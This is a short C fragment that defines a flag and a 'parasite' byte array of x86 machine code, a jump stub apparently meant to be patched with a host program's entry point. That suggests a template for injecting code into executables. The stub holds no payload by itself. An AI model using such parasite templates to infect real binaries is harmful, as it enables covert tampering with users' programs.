int return_entry_start = 1;

char parasite[] =
	"\xb8\x00\x00\x00\x00"      
	"\xff\xe0"                  
;
